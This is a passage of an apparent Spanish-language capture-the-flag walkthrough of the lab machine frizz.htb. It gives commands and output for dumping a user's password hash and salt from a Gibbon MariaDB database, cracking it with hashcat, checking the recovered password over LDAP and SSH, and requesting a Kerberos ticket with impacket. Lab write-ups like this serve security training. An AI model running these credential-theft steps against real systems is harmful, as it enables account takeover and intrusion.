</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ sudo mysql -u MrGibbonsDB -P <span class="m">3306</span> -p --skip-ssl
</span></span><span class="line"><span class="cl">Enter password: 
</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span></span><span class="line"><span class="cl">Your MariaDB connection id is <span class="m">140</span>
</span></span><span class="line"><span class="cl">Server version: 10.4.32-MariaDB mariadb.org binary distribution
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Support MariaDB developers by giving a star at https://github.com/MariaDB/server
</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; show databases<span class="p">;</span>
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbon             <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nb">test</span>               <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl"><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.214 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>De la base de datos gibbon encontramos columnas para credenciales en la tabla <code>gibbonperson</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; use gibbon<span class="p">;</span>
</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Database changed
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>gibbon<span class="o">]</span>&gt; show tables<span class="p">;</span>
</span></span><span class="line"><span class="cl">+---------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_gibbon                      <span class="p">|</span>
</span></span><span class="line"><span class="cl">+---------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonaction                          <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonactivity                        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonactivityattendance              <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>...<span class="o">]</span> snip <span class="o">[</span>...<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonoutcome                         <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonpayment                         <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonpermission                      <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonperson                          <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonpersonaldocument                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonpersonaldocumenttype            <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>...<span class="o">]</span> snip <span class="o">[</span>...<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonusernameformat                  <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonyeargroup                       <span class="p">|</span>
</span></span><span class="line"><span class="cl">+---------------------------------------+
</span></span><span class="line"><span class="cl"><span class="m">191</span> rows in <span class="nb">set</span> <span class="o">(</span>0.216 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>gibbon<span class="o">]</span>&gt; describe gibbonperson<span class="p">;</span>
</span></span><span class="line"><span class="cl">+---------------------------+-------------------------------------------------------+------+-----+-------------+----------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Field                     <span class="p">|</span> Type                                                  <span class="p">|</span> Null <span class="p">|</span> Key <span class="p">|</span> Default     <span class="p">|</span> Extra          <span class="p">|</span>
</span></span><span class="line"><span class="cl">+---------------------------+-------------------------------------------------------+------+-----+-------------+----------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> gibbonPersonID            <span class="p">|</span> int<span class="o">(</span>10<span class="o">)</span> unsigned zerofill                             <span class="p">|</span> NO   <span class="p">|</span> PRI <span class="p">|</span> NULL        <span class="p">|</span> auto_increment <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> title                     <span class="p">|</span> varchar<span class="o">(</span>5<span class="o">)</span>                                            <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL        <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> surname                   <span class="p">|</span> varchar<span class="o">(</span>60<span class="o">)</span>                                           <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span>             <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> firstName                 <span class="p">|</span> varchar<span class="o">(</span>60<span class="o">)</span>                                           <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span>             <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> preferredName             <span class="p">|</span> varchar<span class="o">(</span>60<span class="o">)</span>                                           <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span>             <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> officialName              <span class="p">|</span> varchar<span class="o">(</span>150<span class="o">)</span>                                          <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL        <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> nameInCharacters          <span class="p">|</span> varchar<span class="o">(</span>60<span class="o">)</span>                                           <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL        <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> gender                    <span class="p">|</span> enum<span class="o">(</span><span class="s1">&#39;M&#39;</span>,<span class="s1">&#39;F&#39;</span>,<span class="s1">&#39;Other&#39;</span>,<span class="s1">&#39;Unspecified&#39;</span><span class="o">)</span>                   <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> Unspecified <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> username                  <span class="p">|</span> varchar<span class="o">(</span>20<span class="o">)</span>                                           <span class="p">|</span> NO   <span class="p">|</span> UNI <span class="p">|</span> NULL        <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> passwordStrong            <span class="p">|</span> varchar<span class="o">(</span>255<span class="o">)</span>                                          <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL        <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> passwordStrongSalt        <span class="p">|</span> varchar<span class="o">(</span>255<span class="o">)</span>                                          <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL        <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> passwordForceReset        <span class="p">|</span> enum<span class="o">(</span><span class="s1">&#39;N&#39;</span>,<span class="s1">&#39;Y&#39;</span><span class="o">)</span>                                         <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> N           <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> status                    <span class="p">|</span> enum<span class="o">(</span><span class="s1">&#39;Full&#39;</span>,<span class="s1">&#39;Expected&#39;</span>,<span class="s1">&#39;Left&#39;</span>,<span class="s1">&#39;Pending Approval&#39;</span><span class="o">)</span>     <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> Full        <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> canLogin                  <span class="p">|</span> enum<span class="o">(</span><span class="s1">&#39;Y&#39;</span>,<span class="s1">&#39;N&#39;</span><span class="o">)</span>                                         <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> Y           <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>...<span class="o">]</span> snip <span class="o">[</span>...<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">|</span> fields                    <span class="p">|</span> text                                                  <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL        <span class="p">|</span>                <span class="p">|</span>
</span></span><span class="line"><span class="cl">+---------------------------+-------------------------------------------------------+------+-----+-------------+----------------+
</span></span><span class="line"><span class="cl"><span class="m">94</span> rows in <span class="nb">set</span> <span class="o">(</span>0.217 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>gibbon<span class="o">]</span>&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Obtuvimos los registros de estas columnas y se observa el usuario <code>f.frizzle</code> con el hash y salt de contrasena.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">MariaDB <span class="o">[</span>gibbon<span class="o">]</span>&gt; <span class="k">select</span> username,passwordStrong,passwordStrongSalt from gibbonperson<span class="p">;</span>
</span></span><span class="line"><span class="cl">+-----------+------------------------------------------------------------------+------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> username  <span class="p">|</span> passwordStrong                                                   <span class="p">|</span> passwordStrongSalt     <span class="p">|</span>
</span></span><span class="line"><span class="cl">+-----------+------------------------------------------------------------------+------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> f.frizzle <span class="p">|</span> 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 <span class="p">|</span> /aACFhikmNopqrRTVz2489 <span class="p">|</span>
</span></span><span class="line"><span class="cl">+-----------+------------------------------------------------------------------+------------------------+
</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.214 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>gibbon<span class="o">]</span>&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="cracking-the-hash">Cracking the Hash</h2>
<p>Segun el codigo de Gibbon, este utiliza <a href="https://github.com/GibbonEdu/core/blob/v29.0.00/publicRegistrationProcess.php#L76">Sha256</a> para los hashes. Agregamos el hash y salt en un archivo.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># SHA256</span>
</span></span><span class="line"><span class="cl"><span class="c1"># username | passwordStrong | passwordStrongSalt</span>
</span></span><span class="line"><span class="cl"><span class="c1"># f.frizzle	067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03	/aACFhikmNopqrRTVz2489</span>
</span></span><span class="line"><span class="cl">067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ejecutamos hashcat sobre el archivo utilizando el modo 1420 que representa <code>sha256($salt.$pass)</code>, logrando obtener en texto plano el valor de la contrasena.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\s</span>ckull<span class="se">\D</span>ocuments<span class="se">\h</span>ashcat-6.2.6&gt; .<span class="se">\h</span>ashcat.exe -m <span class="m">1420</span> -a <span class="m">0</span> ../hash/frizz_hash rockyou.txt
</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>...<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Optimizers applied:
</span></span><span class="line"><span class="cl">* Zero-Byte
</span></span><span class="line"><span class="cl">* Early-Skip
</span></span><span class="line"><span class="cl">* Not-Iterated
</span></span><span class="line"><span class="cl">* Single-Hash
</span></span><span class="line"><span class="cl">* Single-Salt
</span></span><span class="line"><span class="cl">* Raw-Hash
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> backend kernels selected.
</span></span><span class="line"><span class="cl">Pure kernels can crack longer passwords, but drastically reduce performance.
</span></span><span class="line"><span class="cl">If you want to switch to optimized kernels, append -O to your commandline.
</span></span><span class="line"><span class="cl">See the above message to find out about the exact limits.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Watchdog: Temperature abort trigger <span class="nb">set</span> to 90c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host memory required <span class="k">for</span> this attack: <span class="m">421</span> MB
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Dictionary cache hit:
</span></span><span class="line"><span class="cl">* Filename..: rockyou.txt
</span></span><span class="line"><span class="cl">* Passwords.: <span class="m">14344385</span>
</span></span><span class="line"><span class="cl">* Bytes.....: <span class="m">139921507</span>
</span></span><span class="line"><span class="cl">* Keyspace..: <span class="m">14344385</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Mode........: <span class="m">1420</span> <span class="o">(</span>sha256<span class="o">(</span><span class="nv">$salt</span>.<span class="nv">$pass</span><span class="o">))</span>
</span></span><span class="line"><span class="cl">Hash.Target......: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff...Vz2489
</span></span><span class="line"><span class="cl">Time.Started.....: Wed Mar <span class="m">19</span> 04:54:26 <span class="m">2025</span> <span class="o">(</span><span class="m">1</span> sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">Time.Estimated...: Wed Mar <span class="m">19</span> 04:54:27 <span class="m">2025</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>rockyou.txt<span class="o">)</span>
</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
</span></span><span class="line"><span class="cl">Speed.#1.........: 28190.1 kH/s <span class="o">(</span>1.68ms<span class="o">)</span> @ Accel:1024 Loops:1 Thr:64 Vec:1
</span></span><span class="line"><span class="cl">Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress.........: 12582912/14344385 <span class="o">(</span>87.72%<span class="o">)</span>
</span></span><span class="line"><span class="cl">Rejected.........: 0/12582912 <span class="o">(</span>0.00%<span class="o">)</span>
</span></span><span class="line"><span class="cl">Restore.Point....: 11010048/14344385 <span class="o">(</span>76.76%<span class="o">)</span>
</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
</span></span><span class="line"><span class="cl">Candidates.#1....: Joythedog -&gt; 321dict
</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 32c Fan:  0% Util:  0% Core:2505MHz Mem:8250MHz Bus:8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Started: Wed Mar <span class="m">19</span> 04:54:20 <span class="m">2025</span>
</span></span><span class="line"><span class="cl">Stopped: Wed Mar <span class="m">19</span> 04:54:27 <span class="m">2025</span>
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\s</span>ckull<span class="se">\D</span>ocuments<span class="se">\h</span>ashcat-6.2.6&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="user---ffrizzle">User - f.frizzle</h1>
<p>f.frizzle tiene acceso por ldap unicamente con autenticacion por Kerberos, netexec no muestra si fue exitosa la autenticacion por SSH por medio de Kerberos.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ netexec ldap 10.10.11.60 -u <span class="s2">&#34;f.frizzle&#34;</span> -p <span class="s2">&#34;Jenni_Luvs_Magic23&#34;</span>
</span></span><span class="line"><span class="cl">LDAP        10.10.11.60     <span class="m">389</span>    frizzdc.frizz.htb <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:frizzdc.frizz.htb<span class="o">)</span> <span class="o">(</span>domain:frizz.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">LDAP        10.10.11.60     <span class="m">389</span>    frizzdc.frizz.htb <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\f</span>.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED
</span></span><span class="line"><span class="cl">â¯ netexec ldap 10.10.11.60 -u <span class="s2">&#34;f.frizzle&#34;</span> -p <span class="s2">&#34;Jenni_Luvs_Magic23&#34;</span> -k
</span></span><span class="line"><span class="cl">LDAP        10.10.11.60     <span class="m">389</span>    frizzdc.frizz.htb <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:frizzdc.frizz.htb<span class="o">)</span> <span class="o">(</span>domain:frizz.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">LDAP        10.10.11.60     <span class="m">389</span>    frizzdc.frizz.htb <span class="o">[</span>+<span class="o">]</span> frizz.htb<span class="se">\f</span>.frizzle:Jenni_Luvs_Magic23 
</span></span><span class="line"><span class="cl">â¯
</span></span><span class="line"><span class="cl">â¯ netexec ssh 10.10.11.60 -u <span class="s2">&#34;f.frizzle&#34;</span> -p <span class="s2">&#34;Jenni_Luvs_Magic23&#34;</span>
</span></span><span class="line"><span class="cl">SSH         10.10.11.60     <span class="m">22</span>     10.10.11.60      <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_for_Windows_9.5
</span></span><span class="line"><span class="cl">SSH         10.10.11.60     <span class="m">22</span>     10.10.11.60      <span class="o">[</span>-<span class="o">]</span> f.frizzle:Jenni_Luvs_Magic23
</span></span><span class="line"><span class="cl">â¯ netexec ssh 10.10.11.60 -u <span class="s2">&#34;f.frizzle&#34;</span> -p <span class="s2">&#34;Jenni_Luvs_Magic23&#34;</span> -k
</span></span><span class="line"><span class="cl">SSH         10.10.11.60     <span class="m">22</span>     10.10.11.60      <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_for_Windows_9.5
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bloodhound">Bloodhound</h2>
<p>Con credenciales validas encontradas ejecutamos <code>impacket-getTGT</code> para obtener un ticket para este usuario.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23
</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in f.frizzle.ccache
</span></span><span class="line"><span class="cl">â¯ impacket-describeTicket f.frizzle.ccache
</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Number of credentials in cache: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Parsing credential<span class="o">[</span>0<span class="o">]</span>:
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Ticket Session Key            : 6c0be53dcc7ecf0edb45f426c767f0338cefe31e4095425bcec5e232bb7b1f63
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> User Name                     : f.frizzle
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> User Realm                    : FRIZZ.HTB
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Service Name                  : krbtgt/FRIZZ.HTB
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Service Realm                 : FRIZZ.HTB
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Start Time                    : 28/03/2025 04:26:23 AM
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> End Time                      : 28/03/2025 14:26:23 PM
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> RenewTill                     : 29/03/2025 04:25:56 AM
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Flags                         : <span class="o">(</span>0x50e10000<span class="o">)</span> forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> KeyType                       : aes256_cts_hmac_sha1_96
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Base64<span class="o">(</span>key<span class="o">)</span>                   : bAvlPcx+zw7bRfQmx2fwM4zv4x5AlUJbzsXiMrt7H2M<span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Decoding unencrypted data in credential<span class="o">[</span>0<span class="o">][</span><span class="s1">&#39;ticket&#39;</span><span class="o">]</span>:
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   Service Name                : krbtgt/FRIZZ.HTB
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   Service Realm               : FRIZZ.HTB
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   Encryption <span class="nb">type</span>             : aes256_cts_hmac_sha1_96 <span class="o">(</span>etype 18<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 <span class="o">(</span>etype 18<span class="o">)</span>, but no keys/creds were supplied
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><p>Utilizamos el ticket con bloodhound-python para obtener infromacion del AD.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
